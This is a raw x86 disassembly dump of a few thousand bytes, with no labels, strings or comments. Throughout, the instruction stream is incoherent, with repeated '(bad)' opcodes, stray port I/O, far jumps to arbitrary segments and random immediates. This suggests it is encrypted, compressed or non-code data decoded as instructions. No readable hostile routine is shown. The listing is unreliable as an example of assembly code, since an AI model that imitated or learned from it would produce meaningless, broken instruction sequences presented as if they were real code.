  421e4b:	sub    bh,0x47
  421e4e:	cli    
  421e4f:	popf   
  421e50:	and    edx,DWORD PTR [eax-0x43]
  421e53:	adc    DWORD PTR [eax+0x2cfd9be9],0x31a8d6e5
  421e5d:	push   ecx
  421e5e:	mov    cl,0xc2
  421e60:	cmc    
  421e61:	test   al,0x8a
  421e63:	mov    bh,0x89
  421e65:	ds or  al,ah
  421e68:	push   es
  421e69:	sub    BYTE PTR [edx+0x17d6a687],bh
  421e6f:	inc    esp
  421e70:	push   esi
  421e71:	lea    esp,[edx+0x69f861bb]
  421e77:	out    dx,eax
  421e78:	mov    bh,0xf5
  421e7a:	pusha  
  421e7b:	mov    al,ds:0x3beab649
  421e80:	sub    eax,0xde88d711
  421e85:	call   0x93402a6e
  421e8a:	cmc    
  421e8b:	push   edi
  421e8c:	not    BYTE PTR [eax]
  421e8e:	mov    ds:0x8e77839c,eax
  421e93:	fs mov bl,0xb9
  421e96:	lods   al,BYTE PTR ds:[esi]
  421e97:	test   al,0xe0
  421e99:	les    ebp,FWORD PTR [ebx+0xd]
  421e9c:	and    BYTE PTR [ecx-0x6e5e1cc9],bh
  421ea2:	cmp    eax,0x6ece7379
  421ea7:	mov    BYTE PTR [edx],al
  421ea9:	dec    esp
  421eaa:	pushf  
  421eab:	mov    edi,0x73077fa2
  421eb0:	int    0x6
  421eb2:	fwait
  421eb3:	jae    0x421e41
  421eb5:	cmc    
  421eb6:	jb     0x421ea2
  421eb8:	imul   ebx,DWORD PTR [edx+0x30],0xffffff93
  421ebc:	test   DWORD PTR [ebp+0x49f42417],edi
  421ec2:	inc    ebx
  421ec3:	push   ds
  421ec4:	int3   
  421ec5:	push   esp
  421ec6:	jae    0x421e7f
  421ec8:	dec    eax
  421ec9:	ficom  WORD PTR [eax]
  421ecb:	adc    eax,0xd5fdaad8
  421ed0:	jecxz  0x421e95
  421ed2:	sbb    eax,0x47a56c35
  421ed8:	add    BYTE PTR [ebx+0x20c54a7e],0xf7
  421edf:	retf   
  421ee0:	mov    WORD PTR cs:[edx],ss
  421ee3:	sub    al,0x4a
  421ee5:	(bad)  [ebx-0x24]
  421ee8:	mov    bh,0x52
  421eea:	popf   
  421eeb:	fs inc edx
  421eed:	cli    
  421eee:	ds sbb eax,ecx
  421ef1:	mov    ecx,0x1ac93b88
  421ef6:	mov    al,0xba
  421ef8:	call   0x5c42:0x3f7be621
  421eff:	mov    ecx,0x1cc0109a
  421f04:	cdq    
  421f05:	push   ebx
  421f06:	add    al,0x25
  421f08:	mov    ch,0x1e
  421f0a:	xchg   edx,eax
  421f0b:	inc    eax
  421f0c:	bound  edi,QWORD PTR [esp+ebp*8+0x14dea518]
  421f13:	xchg   ebp,eax
  421f14:	ins    BYTE PTR es:[edi],dx
  421f15:	(bad)  [ebx+edi*2+0x6dc46738]
  421f1c:	jmp    0x3894dffa
  421f21:	rcl    DWORD PTR [edx-0x19],0x5
  421f25:	mov    dh,0x81
  421f27:	pop    edx
  421f28:	pop    eax
  421f29:	fisub  WORD PTR [ecx]
  421f2b:	mov    edi,0x1bfadfd8
  421f30:	fisub  DWORD PTR [ecx+0x19]
  421f33:	jmp    0x4583da00
  421f38:	pop    eax
  421f39:	popa   
  421f3a:	push   0x69ac597
  421f3f:	fadd   QWORD PTR ds:0xcfe24534
  421f45:	aad    0x90
  421f47:	lahf   
  421f48:	(bad)  
  421f49:	jb     0x421f10
  421f4b:	lds    edi,FWORD PTR [ebp+ebp*8+0x3]
  421f4f:	clc    
  421f50:	or     BYTE PTR [eax],ch
  421f52:	aam    0xf4
  421f54:	jp     0x421f27
  421f56:	xlat   BYTE PTR ds:[ebx]
  421f57:	loop   0x421f3b
  421f59:	das    
  421f5a:	inc    edi
  421f5b:	daa    
  421f5c:	(bad)  
  421f5d:	aad    0xdc
  421f5f:	mov    ch,BYTE PTR [ebx+0x5f1d3979]
  421f65:	sub    ch,BYTE PTR [esi+0x785e803b]
  421f6b:	add    al,0x60
  421f6d:	push   ebp
  421f6e:	(bad)  
  421f6f:	xor    eax,0x1b32c30e
  421f74:	push   ebp
  421f75:	gs mov ebx,0xb579d71
  421f7b:	push   ecx
  421f7c:	in     al,0x6d
  421f7e:	sar    al,0x79
  421f81:	jo     0x421f7b
  421f83:	ins    DWORD PTR es:[edi],dx
  421f84:	adc    ah,BYTE PTR [esi-0x8]
  421f87:	shl    BYTE PTR [ecx+eiz*2+0x2e],0x6a
  421f8c:	fist   WORD PTR [esi-0x6f]
  421f8f:	rcr    BYTE PTR [edx+ecx*2-0x55d3bea8],0x8
  421f97:	add    al,0x2e
  421f99:	ja     0x421f77
  421f9b:	sahf   
  421f9c:	jp     0x421f97
  421f9e:	mov    ebp,0xa5beed9e
  421fa3:	(bad)  
  421fa4:	out    0x55,eax
  421fa6:	fnstenv [ebx+0x6cd99fa5]
  421fac:	in     eax,dx
  421fad:	cmc    
  421fae:	in     al,dx
  421faf:	fs xor dl,al
  421fb2:	dec    ecx
  421fb3:	sub    dh,BYTE PTR [edx]
  421fb5:	fld    QWORD PTR [eax+0x64]
  421fb8:	idiv   BYTE PTR [ebx-0x50853b7b]
  421fbe:	outs   dx,BYTE PTR ds:[esi]
  421fbf:	sbb    BYTE PTR [edx],ch
  421fc1:	pmulhuw mm6,QWORD PTR [edi+0x37bc5a8b]
  421fc8:	mov    ah,0x80
  421fca:	div    DWORD PTR [edi]
  421fcc:	push   ds
  421fcd:	and    al,0x5f
  421fcf:	sti    
  421fd0:	cli    
  421fd1:	and    BYTE PTR [ecx+0x3cc63652],0x3e
  421fd8:	ror    bl,1
  421fda:	fsubp  st(3),st
  421fdc:	adc    eax,0x2c8a3775
  421fe1:	ins    BYTE PTR es:[edi],dx
  421fe2:	les    edi,FWORD PTR [ebp+0x4d2e0b64]
  421fe8:	ffreep st(4)
  421fea:	jbe    0x422029
  421fec:	jno    0x422023
  421fee:	and    DWORD PTR [ebp+0x0],0xa6156dc8
  421ff5:	inc    esi
  421ff6:	stos   DWORD PTR es:[edi],eax
  421ff7:	add    al,0xc9
  421ff9:	jno    0x421f96
  421ffb:	mov    ah,0x98
  421ffd:	sub    edi,DWORD PTR ds:0x870e2d5d
  422003:	pop    ebx
	...
  422010:	add    BYTE PTR [edx+0x4f],al
  422013:	nop
  422014:	int3   
  422015:	popf   
  422016:	fistp  WORD PTR [esi-0x31]
  422019:	lea    ecx,[ebx]
  42201b:	jmp    0xe0b09b76
  422020:	mov    esp,0x1991b
  422025:	stos   DWORD PTR es:[edi],eax
  422026:	add    eax,DWORD PTR [eax]
  422028:	add    BYTE PTR [edx+0x572c482d],al
  42202e:	cmp    al,0xc5
  422030:	push   0xd41c3628
  422035:	mov    eax,ds:0xb0406351
  42203a:	popf   
  42203b:	dec    ebp
  42203c:	retf   0xf762
  42203f:	or     al,dh
  422041:	jns    0x421ff0
  422043:	add    eax,DWORD PTR [ebx-0x6e5afa51]
  422049:	xchg   edx,eax
  42204a:	jae    0x421fea
  42204c:	mov    ds:0xe4fb7628,eax
  422051:	repz aaa 
  422053:	in     al,dx
  422054:	mov    al,0x83
  422056:	jmp    0x422061
  422058:	sbb    esi,edx
  42205a:	sti    
  42205b:	int    0x44
  42205d:	int3   
  42205e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42205f:	shl    ch,cl
  422061:	xchg   esi,eax
  422062:	xor    bl,cl
  422064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422065:	ror    BYTE PTR [ecx],cl
  422067:	jecxz  0x4220cc
  422069:	mov    ds:0xe5fc42f2,al
  42206e:	inc    edx
  42206f:	jl     0x422075
  422071:	mov    cl,0x7b
  422073:	fcomp  QWORD PTR [esi+0x78]
  422076:	mov    BYTE PTR [ecx-0x1c866a1],al
  42207c:	sub    DWORD PTR [ebx],ebp
  42207e:	fdiv   DWORD PTR [ebx]
  422080:	pop    ds
  422081:	ins    BYTE PTR es:[edi],dx
  422082:	sti    
  422083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422084:	jmp    0x4220ad
  422086:	adc    eax,0x3acc21eb
  42208b:	or     eax,0xc475d81b
  422090:	and    BYTE PTR ds:[ebx],0x5c
  422094:	mov    bl,0xc7
  422096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422097:	and    BYTE PTR [eax],bl
  422099:	sbb    bl,ah
  42209b:	and    al,0x94
  42209d:	sbb    al,0x31
  42209f:	ds pop ds
  4220a1:	lods   al,BYTE PTR ds:[esi]
  4220a2:	repnz push ecx
  4220a4:	inc    eax
  4220a5:	stc    
  4220a6:	mov    bl,0x31
  4220a8:	adc    ch,ch
  4220aa:	push   ebx
  4220ab:	scas   al,BYTE PTR es:[edi]
  4220ac:	xchg   edi,eax
  4220ad:	or     ch,dl
  4220af:	fisttp DWORD PTR [esi+0x397b679b]
  4220b5:	(bad)  
  4220b6:	dec    ebp
  4220b7:	and    al,bh
  4220b9:	ror    DWORD PTR [edi],0xa2
  4220bc:	mov    esp,fs
  4220be:	fstp   DWORD PTR [ebx+0x56]
  4220c1:	inc    ecx
  4220c2:	into   
  4220c3:	sbb    al,BYTE PTR [ebx-0x4ce23604]
  4220c9:	arpl   WORD PTR [eax-0x130e56eb],bx
  4220cf:	pop    es
  4220d0:	lock cmp DWORD PTR [ebx+0x4afe111],ecx
  4220d7:	jmp    0x9b00:0xa827c696
  4220de:	xor    eax,0xc7407994
  4220e3:	pop    eax
  4220e4:	in     al,0x17
  4220e6:	aaa    
  4220e7:	xor    eax,0xe13f1295
  4220ec:	aad    0xe8
  4220ee:	jl     0x4220f3
  4220f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220f1:	div    esi
  4220f3:	ret    0xe8a2
  4220f6:	(bad)  
  4220f7:	mov    ?,WORD PTR [ebx+0x69]
  4220fa:	lods   eax,DWORD PTR ds:[esi]
  4220fb:	push   esi
  4220fc:	and    DWORD PTR [edx],0x5f
  4220ff:	scas   eax,DWORD PTR es:[edi]
  422100:	push   ecx
  422101:	out    dx,eax
  422102:	mov    bl,0xa5
  422104:	and    eax,0x13f739d1
  422109:	fldenv [edx+0x4]
  42210c:	pop    ebx
  42210d:	sub    ebx,DWORD PTR [eax+edi*1]
  422110:	jo     0x422148
  422112:	sbb    esi,eax
  422114:	ins    BYTE PTR es:[edi],dx
  422115:	leave  
  422116:	ins    BYTE PTR es:[edi],dx
  422117:	out    0x71,eax
  422119:	loop   0x42212c
  42211b:	push   ebx
  42211c:	mov    al,ds:0xd456524c
  422121:	mov    DWORD PTR [esi],edx
  422123:	push   0xfa3d1d
  422128:	adc    al,0xb1
  42212a:	popf   
  42212b:	mov    edx,0xbe35ba94
  422130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422131:	stc    
  422132:	(bad)  
  422133:	xor    BYTE PTR [ecx+0x5f6782d2],cl
  422139:	pushf  
  42213a:	or     bh,BYTE PTR [esi+ebp*2-0x30]
  42213e:	cmp    DWORD PTR [edi],esi
  422140:	(bad)  
  422141:	loop   0x422153
  422143:	lahf   
  422144:	cmp    eax,0xcf26f001
  422149:	push   ds
  42214a:	stos   DWORD PTR es:[edi],eax
  42214b:	jl     0x4220e4
  42214d:	or     cl,BYTE PTR [edi+ebx*4+0x69]
  422151:	imul   dx,WORD PTR [edx],0xd
  422155:	pop    es
  422156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422157:	mov    ebx,0xf624f3f3
  42215c:	(bad)  
  42215e:	and    edx,ecx
  422160:	test   bh,dh
  422162:	xchg   ecx,eax
  422163:	pushf  
  422164:	sbb    eax,0xb7402450
  422169:	or     eax,0x469341a8
  42216e:	mov    edx,0xa817e998
  422173:	pop    ecx
  422174:	push   eax
  422175:	jmp    DWORD PTR [edx+0x2e95b6c4]
  42217b:	dec    esp
  42217c:	out    0xb,al
  42217e:	push   0x1c53375e
  422183:	int    0x27
  422185:	das    
  422186:	popa   
  422187:	jbe    0x422157
  422189:	add    eax,0x452620bc
  42218e:	add    ebx,esp
  422190:	and    eax,0x3bdf19ba
  422195:	xchg   ebx,eax
  422196:	or     bh,BYTE PTR ds:0xf5eb62f5
  42219c:	cmp    eax,0x5c13927c
  4221a1:	daa    
  4221a2:	push   edx
  4221a3:	pop    edx
  4221a4:	enter  0x1e87,0xcc
  4221a8:	sar    edx,cl
  4221aa:	xchg   DWORD PTR [esi-0x407450b7],esi
  4221b0:	push   es
  4221b1:	sbb    edi,DWORD PTR [ebp+0x6d3606e0]
  4221b7:	jl     0x42214a
  4221b9:	mov    ecx,0x37b15fe2
  4221be:	aad    0x58
  4221c0:	neg    DWORD PTR [ebx]
  4221c2:	push   ebp
  4221c3:	test   eax,0xc4b6fa71
  4221c8:	xor    eax,0x2db560d8
  4221cd:	or     ebp,esi
  4221cf:	xchg   edi,eax
  4221d0:	pop    ecx
  4221d1:	sub    ecx,DWORD PTR ds:0xf3eb9ac3
  4221d7:	pop    esp
  4221d8:	pop    ecx
  4221d9:	inc    eax
  4221da:	inc    edx
  4221db:	mov    cs,WORD PTR [ebx+edi*1+0x305db32f]
  4221e2:	aad    0x12
  4221e4:	es push ebx
  4221e6:	pop    DWORD PTR [ebx]
  4221e8:	bound  eax,QWORD PTR [eax-0x1a]
  4221eb:	idiv   DWORD PTR [edx+ebx*2+0x6a9768de]
  4221f2:	mov    ah,0x3f
  4221f4:	mov    ds:0xa22ef296,eax
  4221f9:	clc    
  4221fa:	ins    DWORD PTR es:[edi],dx
  4221fb:	xor    eax,0xef8d03a8
  422200:	cmp    ebp,esi
  422202:	iret   
  422203:	lods   al,BYTE PTR ds:[esi]
  422204:	add    al,0x7
  422206:	iret   
  422207:	sbb    DWORD PTR [eax],0x7fad0f44
  42220d:	jge    0x42222c
  42220f:	sub    al,0xbf
  422211:	aam    0xa4
  422213:	push   es
  422214:	push   ecx
  422215:	stc    
  422216:	idiv   DWORD PTR [ebx]
  422218:	in     eax,dx
  422219:	and    ah,dl
  42221b:	(bad)  
  42221c:	rcr    DWORD PTR [esi-0x24f32e2a],cl
  422222:	xor    cl,ch
  422224:	push   es
  422225:	ins    DWORD PTR es:[edi],dx
  422226:	or     edi,DWORD PTR [edi]
  422228:	xchg   ebp,eax
  422229:	es gs pop edi
  42222c:	lods   eax,DWORD PTR ds:[esi]
  42222d:	nop
  42222e:	out    dx,al
  42222f:	test   al,0xe7
  422231:	stc    
  422232:	lods   al,BYTE PTR ds:[esi]
  422233:	sub    BYTE PTR [edi+0x4d],dh
  422236:	in     al,dx
  422237:	pop    ecx
  422238:	or     al,0xa1
  42223a:	es leave 
  42223c:	cdq    
  42223d:	iret   
  42223e:	jmp    0xfa2:0x8176053d
  422245:	mov    ah,0x54
  422247:	std    
  422248:	fisubr WORD PTR [edi+eax*4]
  42224b:	xchg   BYTE PTR [edi],ah
  42224d:	pushf  
  42224e:	pushf  
  42224f:	imul   DWORD PTR [ebp+edi*8+0x7f]
  422253:	sub    ebp,DWORD PTR [edi-0x49]
  422256:	sbb    BYTE PTR [eax+0x64b40ee],bl
  42225c:	or     al,0x3f
  42225e:	rcl    al,0xae
  422261:	xor    al,0xb6
  422263:	outs   dx,BYTE PTR ds:[esi]
  422264:	arpl   WORD PTR [ebp-0x56],sp
  422267:	xchg   BYTE PTR [esi-0x10],cl
  42226a:	pop    ecx
  42226b:	test   BYTE PTR [ecx-0x165dd969],dh
  422271:	cwde   
  422272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422273:	mov    esp,0xe89b9c2d
  422278:	icebp  
  422279:	cld    
  42227a:	retf   
  42227b:	inc    ebp
  42227c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42227d:	sub    eax,0xdad2b95
  422282:	cmp    ebx,0x61
  422285:	(bad)  
  422286:	dec    ebp
  422287:	call   0x5567de1
  42228c:	xor    al,0x7
  42228e:	iret   
  42228f:	pop    edi
  422290:	mov    DWORD PTR [ebx-0x3928eb30],esi
  422296:	lods   al,BYTE PTR ds:[esi]
  422297:	push   ecx
  422298:	mov    ecx,0x74dec64d
  42229d:	xor    BYTE PTR [edx+0x4bd520a3],bl
  4222a3:	sti    
  4222a4:	xchg   ebp,eax
  4222a5:	iret   
  4222a6:	fdiv   QWORD PTR [ebx]
  4222a8:	jbe    0x422319
  4222aa:	inc    edi
  4222ab:	mov    esi,0x21640cf2
  4222b0:	test   ecx,ebx
  4222b2:	cmp    bl,BYTE PTR [ebx+ebp*1-0x3e8a41ae]
  4222b9:	(bad)  
  4222ba:	pop    ss
  4222bb:	aaa    
  4222bc:	rcr    BYTE PTR [ecx],1
  4222be:	xchg   ebx,eax
  4222bf:	or     esi,DWORD PTR es:[esi+0x16ba6796]
  4222c6:	dec    edi
  4222c7:	mov    al,ds:0xa8a6fd10
  4222cc:	arpl   WORD PTR [ebp+0x7f],cx
  4222cf:	(bad)  
  4222d0:	dec    esi
  4222d1:	add    bh,dh
  4222d3:	in     eax,0x7d
  4222d5:	das    
  4222d6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4222d8:	int    0x26
  4222da:	cmp    DWORD PTR [eax+0x4f2018d1],edx
  4222e0:	mov    ebp,0x1af35f12
  4222e5:	jno    0x4222dd
  4222e7:	mov    BYTE PTR [ebp-0x67e2740],0x56
  4222ee:	out    0x8,eax
  4222f0:	jns    0x4222d6
  4222f2:	and    cl,BYTE PTR ds:0x1606ffc0
  4222f8:	push   ebx
  4222f9:	ss inc ebp
  4222fb:	call   0x1edfd66b
  422300:	add    BYTE PTR [edi],cl
  422302:	mov    eax,0xec1cde12
  422307:	mov    bh,0x15
  422309:	add    ebp,DWORD PTR [ebx]
  42230b:	mov    ebp,0xc1b35f38
  422310:	xor    bh,BYTE PTR [edx-0x60]
  422313:	jbe    0x4222af
  422315:	jne    0x42231c
  422317:	mov    bl,0xce
  422319:	(bad)  
  42231a:	push   0x2d
  42231c:	mov    al,0xbc
  42231e:	ret    0x5a2
  422321:	stos   BYTE PTR es:[edi],al
  422322:	call   0x813e0c53
  422327:	and    bl,ch
  422329:	push   0x24
  42232b:	xchg   ebx,eax
  42232c:	xor    al,0x13
  42232e:	xchg   edx,eax
  42232f:	pop    edi
  422330:	dec    esp
  422331:	retf   
  422332:	mul    DWORD PTR [ecx]
  422334:	(bad)  
  422335:	fdiv   DWORD PTR [edi+0x58ddba43]
  42233b:	dec    BYTE PTR [eax]
  42233d:	xchg   edi,eax
  42233e:	out    dx,eax
  42233f:	stc    
  422340:	mov    al,ds:0x7f4128ec
  422345:	sub    dl,ch
  422347:	(bad)  
  422348:	in     al,dx
  422349:	in     al,0x9a
  42234b:	arpl   WORD PTR [edx+esi*1+0x34],dx
  42234f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422350:	in     eax,0xef
  422352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422353:	aas    
  422354:	aam    0x44
  422356:	pop    eax
  422357:	xchg   ah,cl
  422359:	clc    
  42235a:	mov    edi,esi
  42235c:	or     bh,BYTE PTR [ebx]
  42235e:	pop    eax
  42235f:	ret    0x29ab
  422362:	push   esp
  422363:	xchg   ebp,eax
  422364:	sbb    eax,ecx
  422366:	xor    DWORD PTR [edx-0x59],0xffffffe3
  42236a:	add    DWORD PTR [ebp-0x2b5048f3],ebx
  422370:	xchg   edi,eax
  422371:	test   BYTE PTR [edx],dl
  422373:	mov    eax,0x3ab82f2
  422378:	pop    ebp
  422379:	mov    ecx,0x748dfeec
  42237e:	int3   
  42237f:	mov    cl,0xf9
  422381:	mov    esi,0x3c730a7d
  422386:	fstp   DWORD PTR [eax+0x7c]
  422389:	xor    ecx,DWORD PTR [edx-0x5c]
  42238c:	add    BYTE PTR [ecx+0xb7de01f],cl
  422392:	outs   dx,DWORD PTR ds:[esi]
  422393:	mov    ecx,0xd764d8df
  422398:	(bad)  
  422399:	nop
  42239a:	jle    0x422401
  42239c:	sub    DWORD PTR [eax-0x2805baa2],esp
  4223a2:	imul   esp,DWORD PTR [edi-0xf],0x80ee98c2
  4223a9:	mov    bh,0xb1
  4223ab:	sub    al,BYTE PTR [eax-0x68df350]
  4223b1:	(bad)  
  4223b2:	mov    ebx,DWORD PTR [edi+0x79]
  4223b5:	mov    dh,0xa5
  4223b7:	je     0x42233f
  4223b9:	imul   esp,DWORD PTR [eax],0xdb63e032
  4223bf:	scas   al,BYTE PTR es:[edi]
  4223c0:	sbb    BYTE PTR [eax+0x52f9df6b],ah
  4223c6:	je     0x422430
  4223c8:	add    eax,0x448af53b
  4223cd:	inc    esi
  4223ce:	les    ebx,FWORD PTR [ebx]
  4223d0:	call   0x0:0x189c9f
	...
  4223df:	add    BYTE PTR [eax],al
  4223e1:	data16 jl 0x4223c4
  4223e4:	mov    ebx,0xfd7fbffa
  4223e9:	pop    esp
  4223ea:	mov    eax,ds:0x4f0a4f5c
  4223ef:	ja     0x422445
  4223f1:	(bad)  
  4223f2:	pushf  
  4223f3:	add    DWORD PTR [eax],eax
  4223f5:	stos   DWORD PTR es:[edi],eax
  4223f6:	add    eax,DWORD PTR [eax]
  4223f8:	add    al,al
  4223fa:	js     0x422427
  4223fc:	stos   DWORD PTR es:[edi],eax
  4223fd:	push   ecx
  4223fe:	cmp    bh,BYTE PTR [edx-0x44]
  422401:	adc    BYTE PTR [edi],ch
  422403:	in     al,dx
  422404:	xchg   edi,eax
  422405:	mov    al,ds:0x6997da62
  42240a:	adc    bl,BYTE PTR [ebp+0x22fe1b95]
  422410:	cmc    
  422411:	imul   edi,DWORD PTR [esi+0x1f47222b],0x5
  422418:	(bad)  
  422419:	loopne 0x42239f
  42241b:	add    edi,DWORD PTR [esp+ecx*4-0x814dbc4]
  422422:	inc    esi
  422423:	repnz in al,dx
  422425:	push   ss
  422426:	mov    ecx,0xd2a782b8
  42242b:	sub    al,ah
  42242d:	inc    esp
  42242e:	daa    
  42242f:	mov    eax,ds:0xf306f156
  422434:	sub    al,0x7d
  422436:	pop    edi
  422437:	sub    DWORD PTR [ecx],esp
  422439:	popf   
  42243a:	rol    esp,0x79
  42243d:	pop    eax
  42243e:	popa   
  42243f:	aad    0xc5
  422441:	es daa 
  422443:	add    DWORD PTR [ebx+0x39],esp
  422446:	or     BYTE PTR [edx+0x34],cl
  422449:	or     edi,DWORD PTR [ebx+0x204eab]
  42244f:	push   esp
  422450:	lahf   
  422451:	pop    ss
  422452:	inc    edi
  422453:	jg     0x4224d1
  422455:	lods   al,BYTE PTR ds:[esi]
  422456:	fidiv  WORD PTR [edi+0x32]
  422459:	clc    
  42245a:	jmp    0x4301:0xe3ab0782
  422461:	adc    DWORD PTR [edx+ebx*4+0x2c13e3b4],esi
  422468:	xchg   esi,eax
  422469:	fcomp  DWORD PTR [eax+0x4b]
  42246c:	mov    al,BYTE PTR [ebp-0x64bae13e]
  422472:	mov    edi,0x7585414e
  422477:	xchg   edx,eax
  422478:	pop    ebp
  422479:	jne    0x422422
  42247b:	cwde   
  42247c:	int    0xbf
  42247e:	test   al,0x6e
  422480:	jnp    0x4224c3
  422482:	push   ds
  422483:	pop    edx
  422484:	push   es
  422485:	xchg   edx,eax
  422486:	pushf  
  422487:	fucomip st,st(7)
  422489:	and    DWORD PTR [eax+0x12],0x3a91fd8c
  422490:	out    dx,al
  422491:	jmp    0x248:0x3f3efb0e
  422498:	mov    al,0x75
  42249a:	adc    bh,BYTE PTR [edx-0x35116eda]
  4224a0:	xchg   esp,eax
  4224a1:	call   0x7445a0e5
  4224a6:	inc    edi
  4224a7:	sbb    eax,0x2f15a8ab
  4224ac:	xlat   BYTE PTR ds:[ebx]
  4224ad:	into   
  4224ae:	inc    ebx
  4224af:	std    
  4224b0:	jp     0x422503
  4224b2:	mov    dh,0x5d
  4224b4:	and    esp,DWORD PTR ds:0x702a4d7d
  4224ba:	stc    
  4224bb:	inc    ebp
  4224bc:	popa   
  4224bd:	add    edx,DWORD PTR [edx-0x63599294]
  4224c3:	int3   
  4224c4:	or     BYTE PTR [esi-0x794eb04c],al
  4224ca:	rcl    BYTE PTR [ebp+0x27],0xa1
  4224ce:	push   ds
  4224cf:	lods   eax,DWORD PTR ds:[esi]
  4224d0:	xor    eax,0x5d48e903
  4224d5:	mov    ch,BYTE PTR [eax+0x464fe4eb]
  4224db:	mov    ebp,DWORD PTR [edx+ebx*2-0x794f046c]
  4224e2:	in     eax,0x85
  4224e4:	jae    0x4224e9
  4224e6:	mov    edi,0x40e454ec
  4224eb:	test   BYTE PTR [ebx],0xf0
  4224ee:	xchg   edi,eax
  4224ef:	and    DWORD PTR [esi],eax
  4224f1:	sar    BYTE PTR [ebp+0x1742336b],cl
  4224f7:	sbb    edi,DWORD PTR [ecx]
  4224f9:	adc    esp,esp
  4224fb:	xchg   edi,eax
  4224fc:	mov    ebx,0x9c6b429a
  422501:	add    ah,bl
  422503:	sahf   
  422504:	add    al,0x19
  422506:	imul   esi,edx,0x8d71b26e
  42250c:	sbb    BYTE PTR [edx+0x12],dh
  42250f:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  422511:	cs push ecx
  422513:	inc    esi
  422514:	and    esp,DWORD PTR ds:0x14294cfd
  42251a:	ins    BYTE PTR es:[edi],dx
  42251b:	mov    ebp,0x1e88cd4a
  422520:	cmp    BYTE PTR [esi+esi*1-0x3e],0x79
  422525:	adc    cl,BYTE PTR [edi+ebp*4-0x2a807b93]
  42252c:	fistp  QWORD PTR [ebp+0x79]
  42252f:	xchg   DWORD PTR [esi+0x75],ecx
  422532:	adc    esi,ebp
  422534:	int3   
  422535:	test   ebx,0xe32cdc73
  42253b:	outs   dx,DWORD PTR ds:[esi]
  42253c:	in     al,dx
  42253d:	fistp  QWORD PTR [ecx+0x1d326ae1]
  422543:	stos   DWORD PTR es:[edi],eax
  422544:	cld    
  422545:	(bad)  
  422546:	ds leave 
  422548:	sub    esp,eax
  42254a:	aad    0x76
  42254c:	nop
  42254d:	test   al,0xb7
  42254f:	in     al,0x3e
  422551:	or     eax,0x2e4f2353
  422556:	aas    
  422557:	jg     0x4225b6
  422559:	and    ebp,DWORD PTR [edi-0x8a6fc37]
  42255f:	ins    BYTE PTR es:[edi],dx
  422560:	outs   dx,BYTE PTR ds:[esi]
  422561:	sbb    ebx,DWORD PTR [edi]
  422563:	(bad)  
  422564:	mov    edx,0xec7e8bbe
  422569:	cmp    ecx,DWORD PTR [edx]
  42256b:	mov    ch,0x8e
  42256d:	mov    edi,0x21270628
  422572:	ret    0x36b4
  422575:	mov    esi,0x7a1e77b7
  42257a:	xlat   BYTE PTR ds:[ebx]
  42257b:	repnz adc DWORD PTR [edi-0x50],ebx
  42257f:	aaa    
  422580:	mov    ?,WORD PTR [edi+0x28]
  422583:	cmp    al,0x61
  422585:	mov    WORD PTR [ecx],es
  422587:	jecxz  0x4225c1
  422589:	idiv   DWORD PTR cs:[edx+0x77c5858a]
  422590:	pop    ds
  422591:	ret    
  422592:	cmp    al,0x15
  422594:	outs   dx,DWORD PTR ds:[esi]
  422595:	iret   
  422596:	inc    edi
  422597:	jmp    0x1b94:0x2589047c
  42259e:	mov    cl,0x39
  4225a0:	push   ecx
  4225a1:	aam    0xc1
  4225a3:	mov    gs,WORD PTR [esi+0x33]
  4225a6:	push   edi
  4225a7:	xchg   BYTE PTR [ecx+0x7],ah
  4225aa:	arpl   dx,di
  4225ac:	mov    ch,0x83
  4225ae:	jmp    0xf62:0x1ae7777f
  4225b5:	ja     0x4225d1
  4225b7:	fldcw  WORD PTR [eax]
  4225b9:	adc    BYTE PTR [edx+edx*8+0x5],0x12
  4225be:	jno    0x42259b
  4225c0:	mov    eax,ds:0x1cb63589
  4225c5:	inc    ebx
  4225c6:	xchg   esp,eax
  4225c7:	sub    al,BYTE PTR [eax-0x4100dca9]
  4225cd:	push   ecx
  4225ce:	cmc    
  4225cf:	pop    esi
  4225d0:	xchg   esp,eax
  4225d1:	sti    
  4225d2:	jae    0x42261f
  4225d4:	stos   DWORD PTR es:[edi],eax
  4225d5:	mov    dh,0xa1
  4225d7:	mov    eax,0x93b90d01
  4225dc:	call   0xf8ed:0xeff08bcd
  4225e3:	fwait
  4225e4:	sbb    BYTE PTR [ecx+0x2c],0xe8
  4225e8:	rcr    DWORD PTR [edx+eiz*2],cl
  4225eb:	mov    edi,0xfeedc052
  4225f0:	loop   0x422655
  4225f2:	int    0xb1
  4225f4:	std    
  4225f5:	mov    edx,0x338a3453
  4225fa:	push   ecx
  4225fb:	jnp    0x4225ae
  4225fd:	and    DWORD PTR fs:[ecx-0x19],0x2e85a79
  422605:	js     0x4225da
  422607:	pop    edx
  422608:	mov    eax,ds:0xe8b6bf07
  42260d:	dec    ecx
  42260e:	and    al,0x4a
  422610:	jmp    0xc2c0171b
  422615:	test   BYTE PTR [esi+0x3],al
  422618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422619:	pop    ebp
  42261a:	addr16 push ebp
  42261c:	retf   
  42261d:	jne    0x4225d1
  42261f:	imul   ecx,DWORD PTR [ecx+0x1fd572a3],0x45991da9
  422629:	dec    edx
  42262a:	inc    eax
  42262b:	adc    eax,0x99876d41
  422630:	rol    bh,1
  422632:	and    eax,0x8d070bb7
  422637:	mov    bl,0xc0
  422639:	inc    ebp
  42263a:	test   dh,ch
  42263c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263d:	adc    DWORD PTR [ebx],edi
  42263f:	xlat   BYTE PTR ds:[ebx]
  422640:	es jle 0x4225f2
  422643:	push   ds
  422644:	xchg   BYTE PTR [ecx+0x2f7ee67],cl
  42264a:	icebp  
  42264b:	pushf  
  42264c:	xchg   BYTE PTR [ebx-0x44],dh
  42264f:	call   0x3594:0x4bcfb778
  422656:	(bad)  
